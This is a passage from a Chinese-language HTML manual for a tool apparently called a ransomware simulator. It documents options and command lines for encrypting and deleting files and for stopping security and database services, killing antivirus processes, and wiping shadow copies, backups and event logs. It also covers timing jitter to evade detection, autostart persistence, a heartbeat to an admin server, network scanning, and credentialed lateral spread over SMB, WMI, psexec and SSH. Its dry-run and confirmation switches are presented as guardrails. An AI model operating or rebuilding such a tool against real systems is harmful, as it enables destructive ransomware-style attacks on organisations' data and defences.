                    <p class="text-sm leading-7 text-gray-600 mb-3">全部参数均支持单横线与双横线写法（如 <code class="px-1.5 py-0.5 bg-gray-100 rounded text-[13px] font-mono">-dir</code> 与 <code class="px-1.5 py-0.5 bg-gray-100 rounded text-[13px] font-mono">--dir</code>）；执行 <code class="px-1.5 py-0.5 bg-gray-100 rounded text-[13px] font-mono">ransom_simulator.exe -h</code> 可查看内置帮助。</p>

                    <h3 class="text-lg font-semibold text-gray-800 mt-6 mb-2">4.1 基础参数</h3>
                    <div class="overflow-x-auto mb-4">
                        <table class="doc-table w-full text-sm border border-collapse">
                            <thead class="bg-gray-50 text-gray-600">
                                <tr><th class="text-left px-3 py-2 border-b border-r">参数</th><th class="text-left px-3 py-2 border-b border-r">类型 / 默认</th><th class="text-left px-3 py-2 border-b">说明与示例</th></tr>
                            </thead>
                            <tbody>
                                <tr><td class="px-3 py-2 border-b border-r font-mono text-[13px]">-dir</td><td class="px-3 py-2 border-b border-r">string / 系统根目录</td><td class="px-3 py-2 border-b">目标目录或单个文件，多目标用英文逗号分隔；指定后忽略扩展名白名单（处理全部文件）。<br><code class="text-[12px]">-dir="D:\test"</code>、<code class="text-[12px]">-dir="/tmp/a.txt,/tmp/b.xlsx"</code></td></tr>
                                <tr><td class="px-3 py-2 border-b border-r font-mono text-[13px]">-ext</td><td class="px-3 py-2 border-b border-r">string / 内置扩展名列表</td><td class="px-3 py-2 border-b">只处理指定扩展名，逗号分隔；可与 <code class="text-[12px]">-dir</code> 组合。<br><code class="text-[12px]">-ext=".docx,.xlsx,.pdf"</code></td></tr>
                                <tr><td class="px-3 py-2 border-b border-r font-mono text-[13px]">-workers</td><td class="px-3 py-2 border-b border-r">int / CPU 核心数</td><td class="px-3 py-2 border-b">并发加密线程数。<br><code class="text-[12px]">-workers=8</code></td></tr>
                                <tr><td class="px-3 py-2 border-b border-r font-mono text-[13px]">-dry-run</td><td class="px-3 py-2 border-b border-r">bool / false</td><td class="px-3 py-2 border-b">演习模式：只列出目标，不加密、不破坏、不改壁纸。<br><code class="text-[12px]">-dry-run</code></td></tr>
                                <tr><td class="px-3 py-2 border-b border-r font-mono text-[13px]">-remove</td><td class="px-3 py-2 border-b border-r">bool / false</td><td class="px-3 py-2 border-b">加密成功后删除源文件（高危）。<br><code class="text-[12px]">-remove</code></td></tr>
                                <tr><td class="px-3 py-2 border-b border-r font-mono text-[13px]">-log</td><td class="px-3 py-2 border-b border-r">bool / false</td><td class="px-3 py-2 border-b">在程序目录输出 <code class="text-[12px]">success_encrypted.log</code>、<code class="text-[12px]">failed_encrypted.log</code>、<code class="text-[12px]">operations.log</code>。<br><code class="text-[12px]">-log</code></td></tr>
                            </tbody>
                        </table>
                    </div>

                    <h3 class="text-lg font-semibold text-gray-800 mt-6 mb-2">4.2 破坏性行为控制</h3>
                    <div class="overflow-x-auto mb-4">
                        <table class="doc-table w-full text-sm border border-collapse">
                            <thead class="bg-gray-50 text-gray-600">
                                <tr><th class="text-left px-3 py-2 border-b border-r">参数</th><th class="text-left px-3 py-2 border-b border-r">默认</th><th class="text-left px-3 py-2 border-b">说明</th></tr>
                            </thead>
                            <tbody>
                                <tr><td class="px-3 py-2 border-b border-r font-mono text-[13px]">--stealth-mode（Linux/macOS：--stealth）</td><td class="px-3 py-2 border-b border-r">false</td><td class="px-3 py-2 border-b">完全跳过阶段 2：不停止服务、不杀进程、不清日志、不断网。</td></tr>
                                <tr><td class="px-3 py-2 border-b border-r font-mono text-[13px]">--no-stop-services</td><td class="px-3 py-2 border-b border-r">false</td><td class="px-3 py-2 border-b">只跳过停止数据库/安全服务，其余阶段 2 操作保留。</td></tr>
                                <tr><td class="px-3 py-2 border-b border-r font-mono text-[13px]">--no-kill-procs</td><td class="px-3 py-2 border-b border-r">false</td><td class="px-3 py-2 border-b">只跳过终止占用文件的进程（office、数据库、杀软等）。</td></tr>
                                <tr><td class="px-3 py-2 border-b border-r font-mono text-[13px]">--no-clear-logs</td><td class="px-3 py-2 border-b border-r">false</td><td class="px-3 py-2 border-b">只跳过清除卷影副本、Windows 备份与事件日志。</td></tr>
                                <tr><td class="px-3 py-2 border-b border-r font-mono text-[13px]">--aggressive-delay</td><td class="px-3 py-2 border-b border-r">0（毫秒）</td><td class="px-3 py-2 border-b">每个破坏性操作之间随机延迟 0~N 毫秒，用于打乱时序特征。<br><code class="text-[12px]">--aggressive-delay=3000</code></td></tr>
                            </tbody>
                        </table>
                    </div>
                    <div class="border-l-4 border-amber-400 bg-amber-50 text-amber-800 text-sm p-4 rounded mb-4">
                        <p>部分操作（停止服务、清理卷影/日志）需要管理员/root 权限；无权限时命令会失败但不影响后续文件加密。</p>
                    </div>

                    <h3 class="text-lg font-semibold text-gray-800 mt-6 mb-2">4.3 定时任务</h3>
                    <div class="overflow-x-auto mb-4">
                        <table class="doc-table w-full text-sm border border-collapse">
                            <thead class="bg-gray-50 text-gray-600">
                                <tr><th class="text-left px-3 py-2 border-b border-r">参数</th><th class="text-left px-3 py-2 border-b border-r">类型 / 默认</th><th class="text-left px-3 py-2 border-b">说明与示例</th></tr>
                            </thead>
                            <tbody>
                                <tr><td class="px-3 py-2 border-b border-r font-mono text-[13px]">--delay</td><td class="px-3 py-2 border-b border-r">duration / 0</td><td class="px-3 py-2 border-b">等待指定时长后执行，支持 <code class="text-[12px]">30s</code>、<code class="text-[12px]">5m</code>、<code class="text-[12px]">2h</code>。<code class="text-[12px]">--delay 30m</code></td></tr>
                                <tr><td class="px-3 py-2 border-b border-r font-mono text-[13px]">--at</td><td class="px-3 py-2 border-b border-r">string / 空</td><td class="px-3 py-2 border-b">绝对时刻：<code class="text-[12px]">"2006-01-02 15:04:05"</code>、<code class="text-[12px]">"15:04"</code>（已过顺延次日）、RFC3339。<code class="text-[12px]">--at "03:00"</code></td></tr>
                                <tr><td class="px-3 py-2 border-b border-r font-mono text-[13px]">--random-delay</td><td class="px-3 py-2 border-b border-r">duration / 0</td><td class="px-3 py-2 border-b">在定时基础上叠加 0~X 随机抖动。<code class="text-[12px]">--random-delay 5m</code></td></tr>
                                <tr><td class="px-3 py-2 border-b border-r font-mono text-[13px]">--foreground</td><td class="px-3 py-2 border-b border-r">bool / false</td><td class="px-3 py-2 border-b">定时任务保持前台等待（默认自动转入后台），Ctrl+C 可中断。</td></tr>
                                <tr><td class="px-3 py-2 border-b border-r font-mono text-[13px]">--no-autostart</td><td class="px-3 py-2 border-b border-r">bool / false</td><td class="px-3 py-2 border-b">不注册开机自启；重启后需手动启动。</td></tr>
                                <tr><td class="px-3 py-2 border-b border-r font-mono text-[13px]">--persist-schedule</td><td class="px-3 py-2 border-b border-r">bool / false</td><td class="px-3 py-2 border-b">注册系统级一次性任务后主进程退出，到点由系统唤起（不常驻内存）。</td></tr>
                                <tr><td class="px-3 py-2 border-b border-r font-mono text-[13px]">--schedule-task-name</td><td class="px-3 py-2 border-b border-r">string / RansomSimTask</td><td class="px-3 py-2 border-b">任务名，用于自启项/系统任务/完成标记。</td></tr>
                                <tr><td class="px-3 py-2 border-b border-r font-mono text-[13px]">--schedule-cleanup</td><td class="px-3 py-2 border-b border-r">bool / true</td><td class="px-3 py-2 border-b">执行结束后自动清理任务与自启项；设为 false 可保留。</td></tr>
                            </tbody>
                        </table>
                    </div>

                    <h3 class="text-lg font-semibold text-gray-800 mt-6 mb-2">4.4 驻留、密钥与心跳</h3>
                    <div class="overflow-x-auto mb-4">
                        <table class="doc-table w-full text-sm border border-collapse">
                            <thead class="bg-gray-50 text-gray-600">
                                <tr><th class="text-left px-3 py-2 border-b border-r">参数</th><th class="text-left px-3 py-2 border-b border-r">默认</th><th class="text-left px-3 py-2 border-b">说明</th></tr>
                            </thead>
                            <tbody>
                                <tr><td class="px-3 py-2 border-b border-r font-mono text-[13px]">--resident</td><td class="px-3 py-2 border-b border-r">false</td><td class="px-3 py-2 border-b">加密完成后驻留后台，保持心跳与单实例锁；Ctrl+C 结束。</td></tr>
                                <tr><td class="px-3 py-2 border-b border-r font-mono text-[13px]">--keep-key</td><td class="px-3 py-2 border-b border-r">false</td><td class="px-3 py-2 border-b">密钥常驻内存并写入 <code class="text-[12px]">key_cache_&lt;uuid&gt;.json</code>，不被扫描/加密/删除。</td></tr>
                                <tr><td class="px-3 py-2 border-b border-r font-mono text-[13px]">--heartbeat-token</td><td class="px-3 py-2 border-b border-r">环境变量 RANSOM_HEARTBEAT_TOKEN</td><td class="px-3 py-2 border-b">后台启用“心跳接收密钥”后必填，请求会带 <code class="text-[12px]">X-Heartbeat-Token</code>。</td></tr>
                            </tbody>
                        </table>
                    </div>

                    <h3 class="text-lg font-semibold text-gray-800 mt-6 mb-2">4.5 攻击面侦察</h3>
                    <div class="overflow-x-auto mb-4">
                        <table class="doc-table w-full text-sm border border-collapse">
                            <thead class="bg-gray-50 text-gray-600">
                                <tr><th class="text-left px-3 py-2 border-b border-r">参数</th><th class="text-left px-3 py-2 border-b border-r">默认</th><th class="text-left px-3 py-2 border-b">说明与示例</th></tr>
                            </thead>
                            <tbody>
                                <tr><td class="px-3 py-2 border-b border-r font-mono text-[13px]">--scan</td><td class="px-3 py-2 border-b border-r">false</td><td class="px-3 py-2 border-b">启用侦察（可与加密流程组合）。</td></tr>
                                <tr><td class="px-3 py-2 border-b border-r font-mono text-[13px]">--scan-only</td><td class="px-3 py-2 border-b border-r">false</td><td class="px-3 py-2 border-b">仅侦察并输出报告，不加密、不破坏。</td></tr>
                                <tr><td class="px-3 py-2 border-b border-r font-mono text-[13px]">--scan-targets</td><td class="px-3 py-2 border-b border-r">空</td><td class="px-3 py-2 border-b">IP/CIDR/主机名，逗号分隔；<code class="text-[12px]">auto</code> 为本机网段 + ARP 邻居。</td></tr>
                                <tr><td class="px-3 py-2 border-b border-r font-mono text-[13px]">--scan-targets-file</td><td class="px-3 py-2 border-b border-r">空</td><td class="px-3 py-2 border-b">目标清单文件，每行一个，# 开头为注释。</td></tr>
                                <tr><td class="px-3 py-2 border-b border-r font-mono text-[13px]">--scan-ports</td><td class="px-3 py-2 border-b border-r">内置常见端口</td><td class="px-3 py-2 border-b">端口列表，如 <code class="text-[12px]">"445,22,3389,3306"</code>。</td></tr>
                                <tr><td class="px-3 py-2 border-b border-r font-mono text-[13px]">--scan-workers</td><td class="px-3 py-2 border-b border-r">128</td><td class="px-3 py-2 border-b">侦察并发数；大网段可提高到 256。</td></tr>
                                <tr><td class="px-3 py-2 border-b border-r font-mono text-[13px]">--scan-timeout</td><td class="px-3 py-2 border-b border-r">800ms</td><td class="px-3 py-2 border-b">单端口探测超时，如 <code class="text-[12px]">500ms</code>。</td></tr>
                                <tr><td class="px-3 py-2 border-b border-r font-mono text-[13px]">--scan-icmp</td><td class="px-3 py-2 border-b border-r">false</td><td class="px-3 py-2 border-b">先用 ping 探活再扫端口，减少无效连接。</td></tr>
                            </tbody>
                        </table>
                    </div>

                    <h3 class="text-lg font-semibold text-gray-800 mt-6 mb-2">4.6 远程横向编排</h3>
                    <div class="overflow-x-auto mb-4">
                        <table class="doc-table w-full text-sm border border-collapse">
                            <thead class="bg-gray-50 text-gray-600">
                                <tr><th class="text-left px-3 py-2 border-b border-r">参数</th><th class="text-left px-3 py-2 border-b border-r">默认</th><th class="text-left px-3 py-2 border-b">说明与示例</th></tr>
                            </thead>
                            <tbody>
                                <tr><td class="px-3 py-2 border-b border-r font-mono text-[13px]">--remote-hosts</td><td class="px-3 py-2 border-b border-r">空</td><td class="px-3 py-2 border-b">远程目标，逗号分隔，支持 <code class="text-[12px]">user@host</code>、<code class="text-[12px]">host:port</code>。</td></tr>
                                <tr><td class="px-3 py-2 border-b border-r font-mono text-[13px]">--remote-hosts-file</td><td class="px-3 py-2 border-b border-r">空</td><td class="px-3 py-2 border-b">目标清单文件（每行一个）。</td></tr>
                                <tr><td class="px-3 py-2 border-b border-r font-mono text-[13px]">--remote-auto</td><td class="px-3 py-2 border-b border-r">false</td><td class="px-3 py-2 border-b">用侦察结果中开放 SMB/SSH/WinRM 的主机作为目标（需配合 --scan）。</td></tr>
                                <tr><td class="px-3 py-2 border-b border-r font-mono text-[13px]">--remote-user / --remote-pass / --remote-domain</td><td class="px-3 py-2 border-b border-r">空</td><td class="px-3 py-2 border-b">认证信息；域账号可写 <code class="text-[12px]">Domain\user</code> 或分别指定。</td></tr>
                                <tr><td class="px-3 py-2 border-b border-r font-mono text-[13px]">--remote-key</td><td class="px-3 py-2 border-b border-r">空</td><td class="px-3 py-2 border-b">SSH 私钥路径（仅 ssh 通道）。</td></tr>
                                <tr><td class="px-3 py-2 border-b border-r font-mono text-[13px]">--remote-port</td><td class="px-3 py-2 border-b border-r">0（自动）</td><td class="px-3 py-2 border-b">默认 445，ssh 通道为 22。</td></tr>
                                <tr><td class="px-3 py-2 border-b border-r font-mono text-[13px]">--remote-method</td><td class="px-3 py-2 border-b border-r">auto</td><td class="px-3 py-2 border-b"><code class="text-[12px]">auto|smb|wmi|schtasks|psexec</code>（Windows）；Linux/macOS 为 <code class="text-[12px]">ssh</code>。smb 为仅投递。</td></tr>
                                <tr><td class="px-3 py-2 border-b border-r font-mono text-[13px]">--remote-staging</td><td class="px-3 py-2 border-b border-r">Win: C:\ProgramData\RsSim；Unix: /tmp/.rs_sim</td><td class="px-3 py-2 border-b">远端暂存目录（本地风格路径）。</td></tr>
                                <tr><td class="px-3 py-2 border-b border-r font-mono text-[13px]">--remote-args</td><td class="px-3 py-2 border-b border-r">空</td><td class="px-3 py-2 border-b">透传给远端加密器的参数，如 <code class="text-[12px]">"-workers 8 -ext .docx -remove"</code>。</td></tr>
                                <tr><td class="px-3 py-2 border-b border-r font-mono text-[13px]">--remote-confirm</td><td class="px-3 py-2 border-b border-r">false</td><td class="px-3 py-2 border-b">确认真实执行；缺省仅做连通性 + 投递演练（远端 -dry-run）。</td></tr>
                                <tr><td class="px-3 py-2 border-b border-r font-mono text-[13px]">--remote-cleanup</td><td class="px-3 py-2 border-b border-r">false</td><td class="px-3 py-2 border-b">远程执行结束后清理远端暂存目录。</td></tr>
                            </tbody>
                        </table>
                    </div>

                    <h3 class="text-lg font-semibold text-gray-800 mt-6 mb-2">4.7 内部参数</h3>
                    <div class="overflow-x-auto mb-4">
                        <table class="doc-table w-full text-sm border border-collapse">
                            <thead class="bg-gray-50 text-gray-600">
                                <tr><th class="text-left px-3 py-2 border-b border-r">参数</th><th class="text-left px-3 py-2 border-b">说明</th></tr>
                            </thead>
                            <tbody>
                                <tr><td class="px-3 py-2 border-b border-r font-mono text-[13px]">--daemon-child</td><td class="px-3 py-2 border-b">后台子进程标记，由程序自动添加，请勿手动使用。</td></tr>
                                <tr><td class="px-3 py-2 border-b border-r font-mono text-[13px]">--scheduled-run</td><td class="px-3 py-2 border-b">系统定时任务唤起标记，注册任务时自动添加。</td></tr>
                                <tr><td class="px-3 py-2 border-b border-r font-mono text-[13px]">-h / --help</td><td class="px-3 py-2 border-b">打印内置帮助。</td></tr>
                            </tbody>
                        </table>
                    </div>

                    <h3 class="text-lg font-semibold text-gray-800 mt-6 mb-2">4.8 重点参数深入说明</h3>

                    <div class="border border-gray-200 rounded-xl p-5 mb-4">
                        <p class="font-semibold text-gray-800 mb-1 font-mono text-[13px]">-dir 与 -ext 的组合规则</p>
                        <p class="text-sm leading-7 text-gray-600">指定 <code class="px-1.5 py-0.5 bg-gray-100 rounded text-[13px] font-mono">-dir</code> 后默认处理目录下所有文件；若还想限制类型，可同时给 <code class="px-1.5 py-0.5 bg-gray-100 rounded text-[13px] font-mono">-ext</code>。只想处理单个文件时，把文件路径直接传给 <code class="px-1.5 py-0.5 bg-gray-100 rounded text-[13px] font-mono">-dir</code>。</p>
<pre class="bg-gray-900 text-gray-100 text-[13px] rounded-lg p-4 overflow-x-auto mt-3 mb-0"><code>-dir="D:\test" -ext=".docx,.pdf"
-dir="D:\test\report.docx"</code></pre>
                    </div>

                    <div class="border border-gray-200 rounded-xl p-5 mb-4">
                        <p class="font-semibold text-gray-800 mb-1 font-mono text-[13px]">-remove 的作用范围</p>
                        <p class="text-sm leading-7 text-gray-600">仅删除“加密成功”的源文件；加密失败的文件会保留。远端编排默认不透传 <code class="px-1.5 py-0.5 bg-gray-100 rounded text-[13px] font-mono">-remove</code>，必须写在 <code class="px-1.5 py-0.5 bg-gray-100 rounded text-[13px] font-mono">--remote-args</code> 中才会生效。</p>
                    </div>

                    <div class="border border-gray-200 rounded-xl p-5 mb-4">
                        <p class="font-semibold text-gray-800 mb-1 font-mono text-[13px]">--delay / --at / --random-delay 的优先级</p>
                        <p class="text-sm leading-7 text-gray-600">同时指定时：<code class="px-1.5 py-0.5 bg-gray-100 rounded text-[13px] font-mono">--at</code> 优先于 <code class="px-1.5 py-0.5 bg-gray-100 rounded text-[13px] font-mono">--delay</code>，随后叠加 <code class="px-1.5 py-0.5 bg-gray-100 rounded text-[13px] font-mono">--random-delay</code> 的随机抖动。定时任务默认自动转入后台并注册开机自启，日志写入 <code class="px-1.5 py-0.5 bg-gray-100 rounded text-[13px] font-mono">scheduler.log</code>。</p>
                    </div>

                    <div class="border border-gray-200 rounded-xl p-5 mb-4">
                        <p class="font-semibold text-gray-800 mb-1 font-mono text-[13px]">--persist-schedule 与默认后台定时的区别</p>
                        <p class="text-sm leading-7 text-gray-600">默认后台定时会常驻一个等待进程，并注册开机自启，重启后仍有效；<code class="px-1.5 py-0.5 bg-gray-100 rounded text-[13px] font-mono">--persist-schedule</code> 只注册系统一次性任务后退出，依赖系统调度器（Windows schtasks / Linux systemd-run、at、crontab），不常驻进程。</p>
                    </div>

                    <div class="border border-gray-200 rounded-xl p-5 mb-4">
                        <p class="font-semibold text-gray-800 mb-1 font-mono text-[13px]">--remote-confirm 的安全护栏</p>
                        <p class="text-sm leading-7 text-gray-600">不带该参数时只做端口连通性检查与载荷投递，远端以 <code class="px-1.5 py-0.5 bg-gray-100 rounded text-[13px] font-mono">-dry-run</code> 运行；带上后才真实执行，并可将 <code class="px-1.5 py-0.5 bg-gray-100 rounded text-[13px] font-mono">-workers</code>、<code class="px-1.5 py-0.5 bg-gray-100 rounded text-[13px] font-mono">-remove</code> 等经 <code class="px-1.5 py-0.5 bg-gray-100 rounded text-[13px] font-mono">--remote-args</code> 透传。</p>
                    </div>

                    <div class="border border-gray-200 rounded-xl p-5 mb-4">
                        <p class="font-semibold text-gray-800 mb-1 font-mono text-[13px]">--keep-key 与 --resident 的配合</p>
                        <p class="text-sm leading-7 text-gray-600"><code class="px-1.5 py-0.5 bg-gray-100 rounded text-[13px] font-mono">--keep-key</code> 负责把 UUID 与公钥写入缓存；<code class="px-1.5 py-0.5 bg-gray-100 rounded text-[13px] font-mono">--resident</code> 让进程加密后继续运行并保持心跳。两者都开启时，演练演示中可随时在管理后台看到该终端在线，且密钥文件不会被后续扫描删除。</p>
                    </div>

                    <div class="border border-gray-200 rounded-xl p-5 mb-4">
                        <p class="font-semibold text-gray-800 mb-1 font-mono text-[13px]">-workers 的取值建议</p>
                        <p class="text-sm leading-7 text-gray-600">默认等于 CPU 核心数。磁盘 IO 较慢的机械盘建议 2~4；SSD 或 NVMe 可提高到核心数的 1~2 倍；同时处理大量小文件时提高并发收益更明显。</p>
                    </div>
                </section>

                <section id="keys" class="mb-12">
                    <h2 class="text-2xl font-bold text-gray-800 mb-4 pb-2 border-b border-gray-200">7. 密钥机制</h2>
                    <ol class="list-decimal pl-5 space-y-2 text-sm leading-7 text-gray-600 mb-4">
                        <li><strong>联网优先</strong>：启动时向 Worker 请求新的 RSA 密钥对与 UUID。</li>
                        <li><strong>本地回退</strong>：网络不可用或接口异常时，自动使用程序目录下的公钥文件，不中止任务。</li>
                        <li><strong>缓存</strong>：联网成功后会保存公钥到程序目录，并在用户配置目录保留副本（Windows 为 %AppData%\RansomSimulator\keys）。</li>
                        <li><strong>密钥保留</strong>：加 <code class="px-1.5 py-0.5 bg-gray-100 rounded text-[13px] font-mono">--keep-key</code> 会额外写入 key_cache_&lt;uuid&gt;.json，且不会被扫描、加密或删除。</li>
                    </ol>
                    <p class="text-sm leading-7 text-gray-600 mb-2">离线使用：把公钥命名为以下任意形式放到程序目录：</p>
<pre class="bg-gray-900 text-gray-100 text-[13px] rounded-lg p-4 overflow-x-auto mb-4"><code>public_key_5137d4c3-3901-4528-bfa9-6d9ce88fa287.pem
public_key.pem
mykey.pem   （任意 *.pem 均可）</code></pre>
                    <div class="border-l-4 border-blue-400 bg-blue-50 text-blue-800 text-sm p-4 rounded mb-4">
                        <p>公钥只能用于加密；<strong>解密需要对应的私钥</strong>（联网模式在服务端，离线模式由你自行保存）。</p>
                    </div>
                </section>

                <section id="guardrails" class="mb-12">
                    <h2 class="text-2xl font-bold text-gray-800 mb-4 pb-2 border-b border-gray-200">8. 演习模式与安全护栏</h2>
                    <ul class="list-disc pl-5 space-y-1 text-sm leading-7 text-gray-600">
                        <li><code class="px-1.5 py-0.5 bg-gray-100 rounded text-[13px] font-mono">-dry-run</code>：只列目标，不加密、不破坏、不改壁纸。</li>
                        <li><code class="px-1.5 py-0.5 bg-gray-100 rounded text-[13px] font-mono">--stealth-mode</code>（Linux/macOS 为 <code class="px-1.5 py-0.5 bg-gray-100 rounded text-[13px] font-mono">--stealth</code>）：跳过阶段 2 全部破坏性操作。</li>
                        <li><code class="px-1.5 py-0.5 bg-gray-100 rounded text-[13px] font-mono">--no-stop-services</code> / <code class="px-1.5 py-0.5 bg-gray-100 rounded text-[13px] font-mono">--no-kill-procs</code> / <code class="px-1.5 py-0.5 bg-gray-100 rounded text-[13px] font-mono">--no-clear-logs</code>：按需跳过对应操作。</li>
                        <li>远程编排默认只做连通性与投递演练，必须显式 <code class="px-1.5 py-0.5 bg-gray-100 rounded text-[13px] font-mono">--remote-confirm</code> 才会真实执行。</li>
                        <li><code class="px-1.5 py-0.5 bg-gray-100 rounded text-[13px] font-mono">-remove</code> 不会自动透传到远端，需在 <code class="px-1.5 py-0.5 bg-gray-100 rounded text-[13px] font-mono">--remote-args</code> 中显式写出。</li>
                    </ul>
                </section>

                <section id="schedule" class="mb-12">
                    <h2 class="text-2xl font-bold text-gray-800 mb-4 pb-2 border-b border-gray-200">9. 定时任务与后台驻留</h2>
                    <p class="text-sm leading-7 text-gray-600 mb-3">使用 <code class="px-1.5 py-0.5 bg-gray-100 rounded text-[13px] font-mono">--delay</code> / <code class="px-1.5 py-0.5 bg-gray-100 rounded text-[13px] font-mono">--at</code> 时，程序会自动计算绝对时间并转入后台：</p>
<pre class="bg-gray-900 text-gray-100 text-[13px] rounded-lg p-4 overflow-x-auto mb-4"><code>ransom_simulator.exe -dir="D:\test" -delay 2h -log
# 输出：定时任务已转入后台运行: PID 12345
#      计划启动时间: 2026-12-01 03:00:00
#      后台日志: &lt;程序目录&gt;\scheduler.log</code></pre>
                    <ul class="list-disc pl-5 space-y-1 text-sm leading-7 text-gray-600 mb-4">
                        <li>Windows 使用 DETACHED_PROCESS 脱离控制台；Linux/macOS 使用 setsid 脱离终端，<strong>无需 nohup</strong>。</li>
                        <li>默认自动注册开机自启：Windows 计划任务（ONSTART/ONLOGON），无权限时回退到启动文件夹 VBS；Linux/macOS 使用 crontab @reboot。</li>
                        <li>重启后自启项会重新拉起后台进程；如果目标时间已过，会立即执行。</li>
                        <li>任务完成后写入 <code class="px-1.5 py-0.5 bg-gray-100 rounded text-[13px] font-mono">.schedule_done_&lt;任务名&gt;</code> 并清理自启项，避免重复执行。</li>
                        <li>想保持前台等待：追加 <code class="px-1.5 py-0.5 bg-gray-100 rounded text-[13px] font-mono">--foreground</code>；不想注册自启：追加 <code class="px-1.5 py-0.5 bg-gray-100 rounded text-[13px] font-mono">--no-autostart</code>。</li>
                    </ul>
                    <p class="text-sm leading-7 text-gray-600 mb-2">取消已注册的定时任务：</p>
<pre class="bg-gray-900 text-gray-100 text-[13px] rounded-lg p-4 overflow-x-auto mb-4"><code># Windows
schtasks /delete /tn RansomSimTask-Auto /f
del "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\RansomSimAuto-RansomSimTask.vbs"

# Linux / macOS
crontab -l | grep -v 'RansomSimTask-autostart' | crontab -</code></pre>
                    <p class="text-sm leading-7 text-gray-600">另可用 <code class="px-1.5 py-0.5 bg-gray-100 rounded text-[13px] font-mono">--persist-schedule</code> 注册一次性系统任务（Windows schtasks；Linux systemd-run/at/crontab）。</p>
                </section>

                <section id="heartbeat" class="mb-12">
                    <h2 class="text-2xl font-bold text-gray-800 mb-4 pb-2 border-b border-gray-200">10. 心跳与管理后台</h2>
                    <ul class="list-disc pl-5 space-y-1 text-sm leading-7 text-gray-600 mb-4">
                        <li>程序启动后立即上报一次心跳，之后每 <strong>30 秒</strong>上报一次，正常退出补发 stop。</li>
                        <li>超过 <strong>90 秒</strong>未收到心跳判定为离线。</li>
                        <li>管理后台：<code class="px-1.5 py-0.5 bg-gray-100 rounded text-[13px] font-mono">/admin</code>，使用部署时配置的 ADMIN_TOKEN 作为密码登录。</li>
                        <li>登录后可在 <code class="px-1.5 py-0.5 bg-gray-100 rounded text-[13px] font-mono">/admin/settings</code> 修改登录密钥、密钥接口路径、心跳接收密钥与 Turnstile。</li>
                        <li>若后台启用了“心跳接收密钥”，客户端需加 <code class="px-1.5 py-0.5 bg-gray-100 rounded text-[13px] font-mono">--heartbeat-token &lt;密钥&gt;</code>，否则心跳返回 401、终端显示离线。</li>
                    </ul>
                </section>

                <section id="recon" class="mb-12">
                    <h2 class="text-2xl font-bold text-gray-800 mb-4 pb-2 border-b border-gray-200">11. 攻击面侦察与远程横向加密</h2>
<pre class="bg-gray-900 text-gray-100 text-[13px] rounded-lg p-4 overflow-x-auto mb-4"><code># 仅侦察（不加密、不破坏）
ransom_simulator.exe --scan-only --scan-targets auto --scan-ports "445,22,3389,3306"

# 远程编排演练（默认只连通与投递）
ransom_simulator.exe --remote-hosts "10.0.0.21,10.0.0.22" --remote-user Administrator --remote-pass "***"

# 显式确认真实执行
ransom_simulator.exe --remote-hosts-file targets.txt --remote-user Administrator --remote-pass "***" --remote-confirm</code></pre>
                    <p class="text-sm leading-7 text-gray-600">侦察只做 TCP 连接探测与本机资产枚举，不含漏洞利用与口令爆破；远程编排需要目标侧权限，且必须获得授权。</p>
                </section>

                <section id="decrypt" class="mb-12">
                    <h2 class="text-2xl font-bold text-gray-800 mb-4 pb-2 border-b border-gray-200">12. 解密与恢复</h2>
                    <h3 class="text-lg font-semibold text-gray-800 mt-4 mb-2">9.1 浏览器在线解密</h3>
                    <p class="text-sm leading-7 text-gray-600 mb-3">打开 <a href="/decrypt" class="text-blue-600 underline">/decrypt</a>，输入 UUID 或直接选择私钥文件，解密在浏览器本地完成，文件不会上传。支持标准加密与 PENC 部分加密的大文件。</p>
                    <h3 class="text-lg font-semibold text-gray-800 mt-4 mb-2">9.2 命令行解密</h3>
<pre class="bg-gray-900 text-gray-100 text-[13px] rounded-lg p-4 overflow-x-auto mb-4"><code># 先演练，列出将解密的文件
decryptor.exe -key-file private.pem -dir "D:\test" -dry-run

# 正式解密（可选 -remove 删除 .encrypted 文件）
decryptor.exe -key-file private.pem -dir "D:\test" -workers 4 -verbose -remove</code></pre>
                    <div class="overflow-x-auto mb-4">
                        <table class="doc-table w-full text-sm border border-collapse">
                            <thead class="bg-gray-50 text-gray-600">
                                <tr><th class="text-left px-3 py-2 border-b border-r">参数</th><th class="text-left px-3 py-2 border-b">说明</th></tr>
                            </thead>
                            <tbody>
                                <tr><td class="px-3 py-2 border-b border-r font-mono text-[13px]">-key-file</td><td class="px-3 py-2 border-b">RSA 私钥 PEM 文件（必填）</td></tr>
                                <tr><td class="px-3 py-2 border-b border-r font-mono text-[13px]">-dir</td><td class="px-3 py-2 border-b">扫描目录（默认当前目录）</td></tr>
                                <tr><td class="px-3 py-2 border-b border-r font-mono text-[13px]">-workers</td><td class="px-3 py-2 border-b">并发数（默认 4）</td></tr>
                                <tr><td class="px-3 py-2 border-b border-r font-mono text-[13px]">-dry-run</td><td class="px-3 py-2 border-b">只列出加密文件</td></tr>
                                <tr><td class="px-3 py-2 border-b border-r font-mono text-[13px]">-remove</td><td class="px-3 py-2 border-b">解密成功后删除 .encrypted</td></tr>
                                <tr><td class="px-3 py-2 border-b border-r font-mono text-[13px]">-verbose</td><td class="px-3 py-2 border-b">逐文件输出详情</td></tr>
                            </tbody>
                        </table>
                    </div>
                </section>

                <section id="logging" class="mb-12">
                    <h2 class="text-2xl font-bold text-gray-800 mb-4 pb-2 border-b border-gray-200">13. 日志、报告与文件识别</h2>

                    <h3 class="text-lg font-semibold text-gray-800 mt-6 mb-2">13.1 日志与报告文件</h3>
                    <p class="text-sm leading-7 text-gray-600 mb-2">大多数文件输出在“程序所在目录”；启用 <code class="px-1.5 py-0.5 bg-gray-100 rounded text-[13px] font-mono">-log</code> 后生成加密日志。</p>
                    <div class="overflow-x-auto mb-4">
                        <table class="doc-table w-full text-sm border border-collapse">
                            <thead class="bg-gray-50 text-gray-600"><tr><th class="text-left px-3 py-2 border-b border-r">文件</th><th class="text-left px-3 py-2 border-b border-r">生成条件</th><th class="text-left px-3 py-2 border-b">内容</th></tr></thead>
                            <tbody>
                                <tr><td class="px-3 py-2 border-b border-r font-mono text-[12px]">success_encrypted.log</td><td class="px-3 py-2 border-b border-r"><code class="text-[12px]">-log</code></td><td class="px-3 py-2 border-b">成功加密的文件路径列表</td></tr>
                                <tr><td class="px-3 py-2 border-b border-r font-mono text-[12px]">failed_encrypted.log</td><td class="px-3 py-2 border-b border-r"><code class="text-[12px]">-log</code></td><td class="px-3 py-2 border-b">失败文件与失败原因</td></tr>
